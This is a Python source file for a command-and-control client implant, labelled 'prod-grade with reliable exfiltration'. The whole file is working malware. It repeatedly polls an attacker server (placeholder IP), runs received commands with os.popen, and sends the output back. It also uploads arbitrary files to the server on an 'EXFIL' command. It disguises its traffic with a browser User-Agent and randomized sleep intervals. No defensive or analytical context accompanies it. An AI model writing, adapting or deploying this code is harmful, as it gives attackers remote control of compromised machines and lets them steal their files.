# =======================
# client.py (Prod-grade with Reliable Exfiltration)
# =======================
import requests
import time
import os
import random

C2_URL = "http://<your-server-ip>:8000"  # <-- Replace with actual IP or domain
HEADERS = {"User-Agent": "Mozilla/5.0"}

def exfil_file(filepath):
    if not os.path.isfile(filepath):
        return f"[!] File not found: {filepath}"

    try:
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            files = {"file": (filename, f)}
            r = requests.post(C2_URL + "/upload", headers=HEADERS, files=files)
            return f"[+] File exfiltrated: {filename}" if r.status_code == 200 else f"[!] Upload failed: {r.status_code}"
    except Exception as e:
        return f"[!] Exfil error: {e}"

if __name__ == "__main__":
    while True:
        try:
            response = requests.get(C2_URL, headers=HEADERS, timeout=10)
            cmd = response.text.strip()
            if cmd:
                if cmd.startswith("EXFIL "):
                    path = cmd[6:].strip()
                    output = exfil_file(path)
                else:
                    output = os.popen(cmd).read()
                    if not output:
                        output = "[+] Command executed with no output"
                requests.post(C2_URL, headers=HEADERS, data=output.encode())
        except Exception as e:
            try:
                requests.post(C2_URL, headers=HEADERS, data=f"[!] Error: {e}".encode())
            except:
                pass

        time.sleep(random.randint(5, 12))